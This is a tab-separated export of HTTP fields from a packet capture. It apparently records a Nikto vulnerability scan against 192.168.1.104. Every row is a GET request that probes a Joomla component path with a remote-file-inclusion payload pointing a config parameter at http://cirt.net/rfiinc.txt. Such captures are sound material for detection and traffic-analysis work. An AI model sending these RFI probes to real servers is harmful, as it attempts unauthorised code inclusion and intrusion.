http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.104									10339						1	http://192.168.1.104/administrator/components/com_color/admin.color.php?mosConfig_live_site=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004162)				/administrator/components/com_color/admin.color.php?mosConfig_live_site=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.104									10341						1	http://192.168.1.104/administrator/components/com_competitions/includes/competitions/add.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004163)				/administrator/components/com_competitions/includes/competitions/add.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10343						1	http://192.168.1.104/administrator/components/com_competitions/includes/competitions/competitions.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004164)				/administrator/components/com_competitions/includes/competitions/competitions.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10345						1	http://192.168.1.104/administrator/components/com_competitions/includes/settings/settings.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004165)				/administrator/components/com_competitions/includes/settings/settings.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10347						1	http://192.168.1.104/administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004166)				/administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10349						1	http://192.168.1.104/administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004167)				/administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.104									10351						1	http://192.168.1.104/administrator/components/com_dadamail/config.dadamail.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004168)				/administrator/components/com_dadamail/config.dadamail.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10353						1	http://192.168.1.104/administrator/components/com_dbquery/classes/DBQ/admin/common.class.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004169)				/administrator/components/com_dbquery/classes/DBQ/admin/common.class.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10355						1	http://192.168.1.104/administrator/components/com_events/admin.events.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004170)				/administrator/components/com_events/admin.events.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10357						1	http://192.168.1.104/administrator/components/com_extcalendar/admin_settings.php?CONFIG_EXT[ADMIN_PATH]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004171)				/administrator/components/com_extcalendar/admin_settings.php?CONFIG_EXT[ADMIN_PATH]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10359						1	http://192.168.1.104/administrator/components/com_extended_registration/admin.extended_registration.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004172)				/administrator/components/com_extended_registration/admin.extended_registration.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.104									10361						1	http://192.168.1.104/administrator/components/com_feederator/includes/tmsp/add_tmsp.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004173)				/administrator/components/com_feederator/includes/tmsp/add_tmsp.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10363						1	http://192.168.1.104/administrator/components/com_feederator/includes/tmsp/edit_tmsp.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004174)				/administrator/components/com_feederator/includes/tmsp/edit_tmsp.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10365						1	http://192.168.1.104/administrator/components/com_feederator/includes/tmsp/subscription.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004175)				/administrator/components/com_feederator/includes/tmsp/subscription.php?GLOBALS[mosConfig_absolute_path]=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10367						1	http://192.168.1.104/administrator/components/com_feederator/includes/tmsp/tmsp.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004176)				/administrator/components/com_feederator/includes/tmsp/tmsp.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10369						1	http://192.168.1.104/administrator/components/com_googlebase/admin.googlebase.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004177)				/administrator/components/com_googlebase/admin.googlebase.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10371						1	http://192.168.1.104/administrator/components/com_jcs/jcs.function.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004178)				/administrator/components/com_jcs/jcs.function.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10373						1	http://192.168.1.104/administrator/components/com_jcs/view/add.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004179)				/administrator/components/com_jcs/view/add.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10375						1	http://192.168.1.104/administrator/components/com_jcs/view/history.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004180)				/administrator/components/com_jcs/view/history.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10377						1	http://192.168.1.104/administrator/components/com_jcs/view/register.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004181)				/administrator/components/com_jcs/view/register.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10379						1	http://192.168.1.104/administrator/components/com_jcs/views/list.sub.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004182)				/administrator/components/com_jcs/views/list.sub.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10381						1	http://192.168.1.104/administrator/components/com_jcs/views/list.user.sub.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004183)				/administrator/components/com_jcs/views/list.user.sub.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10383						1	http://192.168.1.104/administrator/components/com_jcs/views/reports.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004184)				/administrator/components/com_jcs/views/reports.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10385						1	http://192.168.1.104/administrator/components/com_jim/install.jim.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004185)				/administrator/components/com_jim/install.jim.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.104									10387						1	http://192.168.1.104/administrator/components/com_jjgallery/admin.jjgallery.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004186)				/administrator/components/com_jjgallery/admin.jjgallery.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.104									10389						1	http://192.168.1.104/administrator/components/com_joom12pic/admin.joom12pic.php?mosConfig_live_site=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004187)				/administrator/components/com_joom12pic/admin.joom12pic.php?mosConfig_live_site=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10391						1	http://192.168.1.104/administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004188)				/administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10393						1	http://192.168.1.104/administrator/components/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004189)				/administrator/components/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10395						1	http://192.168.1.104/administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php?mosConfig_live_site=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004190)				/administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php?mosConfig_live_site=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10397						1	http://192.168.1.104/administrator/components/com_jpack/includes/CAltInstaller.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004191)				/administrator/components/com_jpack/includes/CAltInstaller.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.104									10399						1	http://192.168.1.104/administrator/components/com_jreactions/langset.php?comPath=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004192)				/administrator/components/com_jreactions/langset.php?comPath=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.104									10401						1	http://192.168.1.104/administrator/components/com_juser/xajax_functions.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004193)				/administrator/components/com_juser/xajax_functions.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10403						1	http://192.168.1.104/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004194)				/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.104									10405						1	http://192.168.1.104/administrator/components/com_lurm_constructor/admin.lurm_constructor.php?lm_absolute_path=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004195)				/administrator/components/com_lurm_constructor/admin.lurm_constructor.php?lm_absolute_path=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.104									10407						1	http://192.168.1.104/administrator/components/com_mmp/help.mmp.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004196)				/administrator/components/com_mmp/help.mmp.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??
																	Keep-Alive										192.168.1.104									10409						1	http://192.168.1.104/administrator/components/com_mosmedia/includes/credits.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004197)				/administrator/components/com_mosmedia/includes/credits.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10411						1	http://192.168.1.104/administrator/components/com_mosmedia/includes/info.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004198)				/administrator/components/com_mosmedia/includes/info.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10413						1	http://192.168.1.104/administrator/components/com_mosmedia/includes/media.divs.js.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004199)				/administrator/components/com_mosmedia/includes/media.divs.js.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10415						1	http://192.168.1.104/administrator/components/com_mosmedia/includes/media.divs.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004200)				/administrator/components/com_mosmedia/includes/media.divs.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10417						1	http://192.168.1.104/administrator/components/com_mosmedia/includes/purchase.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004201)				/administrator/components/com_mosmedia/includes/purchase.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10419						1	http://192.168.1.104/administrator/components/com_mosmedia/includes/support.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004202)				/administrator/components/com_mosmedia/includes/support.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10421						1	http://192.168.1.104/administrator/components/com_multibanners/extadminmenus.class.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004203)				/administrator/components/com_multibanners/extadminmenus.class.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
																	Keep-Alive										192.168.1.104									10423						1	http://192.168.1.104/administrator/components/com_nfn_addressbook/nfnaddressbook.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004204)				/administrator/components/com_nfn_addressbook/nfnaddressbook.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??
